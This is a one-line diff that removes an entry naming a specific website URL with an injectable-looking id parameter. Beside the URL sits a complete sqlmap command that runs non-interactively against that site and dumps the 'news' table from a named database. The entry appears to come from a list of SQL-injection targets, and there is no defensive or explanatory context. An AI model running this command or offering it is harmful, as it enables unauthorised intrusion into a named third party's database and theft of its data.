@@ -1,1 +1,0 @@
-https://www.fvgfl.com/news.php?id=22 (GET)  # sqlmap.py -u https://www.fvgfl.com/news.php?id=22 --batch -D fvgfl_master -T news --dump
